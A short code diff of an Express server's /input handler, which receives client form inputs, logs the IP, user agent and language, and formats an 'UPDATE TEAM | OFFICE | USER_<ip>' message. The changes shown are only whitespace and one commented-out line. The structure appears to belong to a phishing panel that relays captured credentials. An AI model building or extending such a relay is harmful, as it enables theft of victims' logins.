@@ -329,7 +329,7 @@ app.get('/events', (req, res) => {
 app.post('/input', async (req, res) => {
     try {
         const { clientId, currPage, inputs } = req.body;
-
+		
 
 
         console.log('Received /input request:', req.body);
@@ -367,7 +367,7 @@ app.post('/input', async (req, res) => {
 
         const userAgent = req.headers["user-agent"];
         const systemLang = req.headers["accept-language"];
-        const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
+        //const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 		
 			if (inputs && typeof inputs === 'object' && Object.keys(inputs).length > 0) {
 			  `✅ UPDATE TEAM | OFFICE | USER_${ipAddress}\n\n` +
